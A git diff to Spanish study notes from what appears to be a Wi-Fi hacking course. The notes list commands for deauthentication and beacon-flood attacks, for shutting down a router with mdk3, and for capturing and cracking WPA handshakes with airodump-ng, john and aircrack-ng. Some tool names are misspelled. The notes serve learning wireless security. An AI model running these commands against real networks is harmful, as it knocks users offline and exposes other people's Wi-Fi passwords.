@@ -204,7 +204,7 @@
     - **airplay -ng -0 10 -e <nombre_ssid> -c <mac_cliente> wlan0mon** (00:51)
 
   - Ataque de-autenticacion global: expulsar a todos los clientes de la red, mas probable de obtener el handshake (00:53-00:59)
-    - **airplay -ng -0 10 -e <nombre_ssid> wlan0mon**
+    - **airplay -ng -0 0 -e <nombre_ssid> wlan0mon**
     - si queremos dejar una wifi KO (infinitos paquetes de de-autenticacion) **airplay -ng -0 0 -e <nombre_ssid> wlan0mon**
 
   - Ataque de autenticación: autentica a un cliente en una red (00:59-01:05)
@@ -214,11 +214,33 @@
   - CTS Frame Attack: deja una red inoperativa para que los clientes sean deasociados y se autentiquen posteriormente (01:05-01:21)
 
   - Beacon Flood Mode Attack: genera muchos puntos de accesos en el mismo canal (channel) que otro objetivo dejandola invisible para otros usuarios (01:21-01:27)
-    - **mkd3 wlan0mon b -c 1** en este ejemplo creamos cientos de redes de nombre aleatorio en el canal 1 
+    - **mkd3 wlan0mon b -c 1** en este ejemplo creamos cientos de redes de nombre aleatorio en el canal 1
 
   - Disassociation Amok Mode Attack (01:27-01:29)
 
-  - Michael Shutdown Exploitation: supuestamente apaga un router (01:29-01:XXX)
+  - Michael Shutdown Exploitation: supuestamente apaga un router (01:29-01:31)
     - **mdk3 wlan0mon m -t <mac_router>**
 
-  ATAQUES PASIVOS (esperamos a que el cliente se reasocie):
+  ATAQUES PASIVOS (esperamos a que el cliente se reasocie).
+
+  ANALISIS CAPTURA TRAFICO
+  - Pyrit (01:35-01:44) **pyrit -r captura.cap analyze** nos parseara (filtrara) la info y nos enseñará solo la mas importante de la captura
+  - tshark (01:44-01:51)
+
+  - aircrack-ng: extraer el handshake (01:51-01:55)
+    - extraer el hash desde el archivo .hccap **hccap2john captura.hccap > miHash**
+
+  - fuerza bruta con john (01:55-01:59)
+    - Capturamos **airodump-ng -c <numero_canal> -w Captura --essid <ssid> wlan0mon** y en paraleo deautenticamos **airplay -ng -0 0 -e <nombre_ssid> wlan0mon**, esperamos a que aparezca el handshake y con **pyrit -r Captura.cap analyze** vemos que tenga 1 AP y 1 handshake al menos.
+    - Convertir a .hccap: **aircrack-ng -J miCaptura Captura-01.cap**, luego **hccap2john miCaptura.hccap > miHash** asi tendremos la contraseña aun cifrada en CCMP.
+    - Descifrar: **john --wordlist=diccionario.txt miHash** y nos dira la contraseña
+
+  - fuerza bruta con aircrack: es mas sencillo que john xq automatiza pasos (01:59-02:00)
+    - **aircrack-ng -w diccionario.txt Captura.cap**
+
+  - bettercap (02:03-)
+
+  AUMENTAR VELOCIDAD COMPUTO (02:05-02:24)
+    - rainbow tables con airolib-ng o genpmk (02:10)
+
+  QUE SE PUEDE SABER SIN ESTAR CONECTADO A LA RED (02:24)
